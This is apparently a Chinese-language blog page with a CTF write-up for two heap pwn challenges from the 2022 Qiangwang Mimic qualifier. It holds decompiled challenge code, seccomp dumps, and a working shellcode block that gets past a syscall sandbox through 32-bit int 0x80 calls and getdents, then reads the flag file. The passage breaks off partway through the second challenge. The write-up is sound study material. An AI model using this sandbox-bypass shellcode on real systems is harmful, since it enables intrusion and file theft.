@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前言初赛的pwn题总体来说还是比较简单，除了一道两解的解释器题目以外别的题目都不算很难（因为知道这题肯定做不出来所以比赛时看都没看一眼），其中有两道题目我觉得学到了挺多，所以在这记录一下 store题目简述：2.31的堆题，菜单增删改查都齐，漏洞是UAF，程序可以exit。我觉得比较新颖的是它用到的沙箱，如下： 1234567891011121314151617181920212223242526">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022强网拟态初赛">
+<meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/2022/11/07/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9B/index.html">
+<meta property="og:site_name" content="CharonPt的Blog">
+<meta property="og:description" content="前言初赛的pwn题总体来说还是比较简单，除了一道两解的解释器题目以外别的题目都不算很难（因为知道这题肯定做不出来所以比赛时看都没看一眼），其中有两道题目我觉得学到了挺多，所以在这记录一下 store题目简述：2.31的堆题，菜单增删改查都齐，漏洞是UAF，程序可以exit。我觉得比较新颖的是它用到的沙箱，如下： 1234567891011121314151617181920212223242526">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-11-07T12:16:27.000Z">
+<meta property="article:modified_time" content="2022-11-11T10:53:28.524Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/11/07/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9B/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>2022强网拟态初赛 | CharonPt的Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CharonPt的Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/11/07/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2022强网拟态初赛
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-11-07 20:16:27" itemprop="dateCreated datePublished" datetime="2022-11-07T20:16:27+08:00">2022-11-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-11-11 18:53:28" itemprop="dateModified" datetime="2022-11-11T18:53:28+08:00">2022-11-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>初赛的pwn题总体来说还是比较简单，除了一道两解的解释器题目以外别的题目都不算很难（<del>因为知道这题肯定做不出来所以比赛时看都没看一眼</del>），其中有两道题目我觉得学到了挺多，所以在这记录一下</p>
+<h2 id="store"><a href="#store" class="headerlink" title="store"></a>store</h2><p>题目简述：2.31的堆题，菜单增删改查都齐，漏洞是UAF，程序可以exit。我觉得比较新颖的是它用到的沙箱，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x0e 0xc000003e  if (A != ARCH_X86_64) goto 0016</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x13 0xffffffff  if (A != 0xffffffff) goto 0024</span><br><span class="line"> 0005: 0x15 0x11 0x00 0x0000000c  if (A == brk) goto 0023</span><br><span class="line"> 0006: 0x15 0x10 0x00 0x00000000  if (A == read) goto 0023</span><br><span class="line"> 0007: 0x15 0x0f 0x00 0x00000001  if (A == write) goto 0023</span><br><span class="line"> 0008: 0x15 0x0e 0x00 0x00000005  if (A == fstat) goto 0023</span><br><span class="line"> 0009: 0x15 0x0d 0x00 0x0000000a  if (A == mprotect) goto 0023</span><br><span class="line"> 0010: 0x15 0x0c 0x00 0x0000003c  if (A == exit) goto 0023</span><br><span class="line"> 0011: 0x15 0x0b 0x00 0x0000005a  if (A == chmod) goto 0023</span><br><span class="line"> 0012: 0x15 0x0a 0x00 0x0000008c  if (A == getpriority) goto 0023</span><br><span class="line"> 0013: 0x15 0x09 0x00 0x0000008d  if (A == setpriority) goto 0023</span><br><span class="line"> 0014: 0x15 0x08 0x00 0x000000c0  if (A == lgetxattr) goto 0023</span><br><span class="line"> 0015: 0x15 0x07 0x08 0x000000e6  if (A == clock_nanosleep) goto 0023 else goto 0024</span><br><span class="line"> 0016: 0x15 0x00 0x07 0x40000003  if (A != ARCH_I386) goto 0024</span><br><span class="line"> 0017: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0018: 0x15 0x04 0x00 0x00000005  if (A == fstat) goto 0023</span><br><span class="line"> 0019: 0x15 0x03 0x00 0x0000005a  if (A == chmod) goto 0023</span><br><span class="line"> 0020: 0x15 0x02 0x00 0x0000008c  if (A == getpriority) goto 0023</span><br><span class="line"> 0021: 0x15 0x01 0x00 0x0000008d  if (A == setpriority) goto 0023</span><br><span class="line"> 0022: 0x15 0x00 0x01 0x000000c0  if (A != lgetxattr) goto 0024</span><br><span class="line"> 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0024: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+
+<p>这部分放到后面重点说</p>
+<p>add如下，最多两个堆指针，同时在<code>Heap[]</code>中的堆指针数小于2的情况下会申请两个相同大小的chunk，其中一个指针保存在<code>Heap[]</code>数组中，另一个保存在另一个数组里，这里有一个比较容易忽略的点在于即便<code>index &gt; 1</code>，也能申请出一个chunk出来，只是这个chunk的指针不会被记录，也不能往里面写内容。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0xFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="keyword">for</span> ( index = <span class="number">0</span>; index &lt;= <span class="number">1</span> &amp;&amp; Heap[index]; ++index )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( index &gt; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;full!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      Heap[index] = v3;</span><br><span class="line">      Size[index] = size;</span><br><span class="line">      qword_4160[index] = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, Heap[index], Size[index]);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Remark: &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, Heap2[index], Size[index]);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;success!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>delete中只会free掉<code>Heap[index]</code>数组中记录的chunk，不会去管另一个。edit能够分别往<code>Heap[index]、Heap2[index]</code>里的chunk里写内容。show用puts函数分别输出<code>Heap[index]、Heap2[index]</code>里的chunk的内容。</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>因为能够申请的堆大小可以是largebin范围里的，而且有两个可控的堆指针、漏洞是UAF，同时即便堆指针满了也可以继续申请chunk，这时就不难想到用largebin attack，程序本身可以exit，很自然就想到可以打IO。这一部分很简单这里不过多赘述，这题的重点在怎么过沙箱。</p>
+<p>在看到mprotect时就可以想到这部分用的应该是shellcode过，第一眼看到这个沙箱时我就感觉是跟2021强网的shellcode题一样的过法（因为ban了open），顺带贴一下那题的沙箱</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x06 0x00 0x00000005  if (A == fstat) goto 0008</span><br><span class="line"> 0002: 0x15 0x05 0x00 0x00000025  if (A == alarm) goto 0008</span><br><span class="line"> 0003: 0x15 0x03 0x00 0x00000004  if (A == stat) goto 0007</span><br><span class="line"> 0004: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>
+
+<p>在复现那题的时候看网上的wp都是先执行<code>retfq</code>去切一下程序架构，然后用<code>int 0x80</code>去跑32位的open。但是在做这题时我发现即便没用<code>retfq</code>去切架构，同样能直接去跑32位的open，这就让我想知道为什么强网那题大家都先切一下架构去跑open然后再切回来跑read……</p>
+<p>为了方便测试，我把强网shellcode那题的可见字符过滤patch掉了，然后试着直接去<code>int 0x80</code>调32位的open，发现同样成功了（仍然要注意寄存器数据的长度），所以对于这题先去切架构是不是多此一举我还留有疑问</p>
+<p>接着我自己写一些沙箱去做测试，然后发现<strong>无论程序本身的架构是32还是64位，程序都会根据具体执行的系统调用指令（<code>int 0x80/syscall</code>）去选择调用32位还是64位的函数</strong>，另外，如果沙箱严格检查程序架构（比如<code>A = arch; if (A != ARCH_X86_64) goto KILL</code>这种格式），<strong>那么无论切不切架构都无法调另一个架构下的函数（即便系统调用号相同）。</strong></p>
+<p>（2022.11.11：目前为止还不知道为什么在这题沙箱的架构检查下可以直接去调另一个架构下相同调用号的函数）</p>
+<h4 id="整体过法"><a href="#整体过法" class="headerlink" title="整体过法"></a>整体过法</h4><p>因为这题远程的flag名称是随机的，所以可以选择先open当前目录，然后调用32位的<code>getdents</code>函数（对应64位的<code>setpriority </code>）来把目录信息读到rsp中，然后用<code>add rcx</code>去让rcx指向flag的名称的地址之后再调orw即可。下面这块shellcode是另一位师傅发的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">shellcode = &#x27;&#x27;&#x27;</span><br><span class="line">	//mmap(0x0x500000,0x5000,3,100022,0,0)</span><br><span class="line">    mov rax, 0xc0</span><br><span class="line">    mov rbx, 0x500000</span><br><span class="line">    mov rcx, 0x5000</span><br><span class="line">    mov rdx, 3</span><br><span class="line">    mov rsi, 1048610</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    xor rbp, rbp</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    mov rsp, 0x500a00</span><br><span class="line">	//open(&#x27;.&#x27;,0,0)</span><br><span class="line">    mov rax, 5</span><br><span class="line">    push 0x2e</span><br><span class="line">    mov rbx, rsp</span><br><span class="line">    xor rcx, rcx</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">	//int getdents(unsigned int fd, struct dirent *dirp, unsigned int count);</span><br><span class="line">	//gendents(3,rsp,0x1337)</span><br><span class="line">    mov rbx, rax</span><br><span class="line">    mov rax, 0x8d</span><br><span class="line">    mov rcx, rsp</span><br><span class="line">    mov rdx, 0x1337</span><br><span class="line">    int 0x80</span><br><span class="line">	</span><br><span class="line">	//make rcx point to flag`s name</span><br><span class="line">    add rcx, 0x56</span><br><span class="line">    </span><br><span class="line">    //open flag</span><br><span class="line">    mov rax, 5</span><br><span class="line">    mov rbx, rcx</span><br><span class="line">    xor rcx, rcx</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 0x100</span><br><span class="line">    xor rax, rax</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 1</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>实际打的时候要调一下<code>add rcx, 0x56</code>的这个值，让rcx指向flag的名字，要做到这点可以先去打印一遍远程目录的信息，找到flag对应的偏移然后更改shellcode即可</p>
+<h2 id="only"><a href="#only" class="headerlink" title="only"></a>only</h2><p>比赛结束后一个小时才做出来，稍微有点可惜</p>
+<p>题目简述：2.31堆题，开了沙箱黑名单ban execve，要注意的是这题的沙箱是用seccomp函数开的，所以bin中本身就有很多chunk。菜单除了一个特别功能以外只有add和delete，漏洞为delete中的UAF。</p>
+<p>最多只能free 4次</p>
+<p>add如下，malloc大小限制在0-0xE7，最多用11次，比较特别的是只有一个堆指针</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !Count_add )                             <span class="comment">// 0xb</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  size = ReadInt();</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0</span> || size &gt; <span class="number">0xE7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  Heap = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !Heap )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">  my_read(Heap, size);</span><br><span class="line">  --Count_add;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>特别功能的函数如下，很明显正常情况下这个函数只能用一次，这个函数的重点在于在<code>Heap</code>非空的情况下其会把对应chunk中的fd和bk置零，利用这个可以把tcache chunk中的key情况，拿一个double free</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add_one</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> Int; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( Mark == <span class="number">0xDEADBEEF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Mark = <span class="number">0</span>;</span><br><span class="line">    Int = <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !Heap )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">      Int = ReadInt();</span><br><span class="line">      <span class="keyword">if</span> ( Int &lt;= <span class="number">0</span> || Int &gt; <span class="number">0xE7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      Heap = <span class="built_in">malloc</span>(Int);</span><br><span class="line">      <span class="keyword">if</span> ( !Heap )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(Heap, <span class="number">0</span>, Int);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>首先很自然能想到的一点就是因为要用ORW，所以肯定要泄漏libc，而且用到的输出函数是puts，那么很明显就是部分fd打stdout。</p>
+<p>程序执行到我们可控的地方时的bin如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0x20 [  7]: 0x55555555b8f0 —▸ 0x55555555ba00 —▸ 0x55555555bcb0 —▸ 0x55555555be30 —▸ 0x55555555bc90 ◂— ...</span><br><span class="line">0x50 [  1]: 0x55555555bf60 ◂— 0x0</span><br><span class="line">0x70 [  7]: 0x55555555b800 —▸ 0x55555555bba0 —▸ 0x55555555b910 —▸ 0x55555555bb30 —▸ 0x55555555bcd0 ◂— ...</span><br><span class="line">0x80 [  5]: 0x55555555b870 —▸ 0x55555555b980 —▸ 0x55555555bc10 —▸ 0x55555555bec0 —▸ 0x55555555ba90 ◂— ...</span><br><span class="line">0xd0 [  1]: 0x55555555b350 ◂— 0x0</span><br><span class="line">0xf0 [  2]: 0x55555555bd40 —▸ 0x55555555b6b0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x55555555b7d0 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
+
+<p>找一下堆可以发现有两个chunk中残留了libc</p>
